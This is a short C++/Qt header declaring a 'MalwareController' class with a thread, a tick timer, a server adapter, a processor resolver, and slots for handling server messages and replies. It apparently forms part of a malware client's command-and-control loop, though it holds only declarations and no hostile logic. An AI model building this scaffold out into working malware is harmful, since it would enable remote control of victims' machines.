#ifndef MALWARECONTROLLER_H
#define MALWARECONTROLLER_H

#include <memory>

#include <QObject>
#include <QThread>
#include <QTimer>

#include "../SharedKernel/Network/serveradapter.h"
#include "../Processors/processorresolverbase.h"

namespace controllers
{
    class MalwareController : public QObject
    {
        Q_OBJECT

    public:
        MalwareController();
        bool isStarted();
        void start();
        void stop();

    private:
        QThread thread_;
        QTimer timer_;
        std::unique_ptr<network::ServerAdapter> serverAdapter_;
        std::unique_ptr<processors::ProcessorResolverBase> processorResolver_;
        bool hasEmittedHello_ = false;

    private slots:
        void onTick();
        void onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage> message);
        void onServerReplied();
    };
}

#endif // MALWARECONTROLLER_H
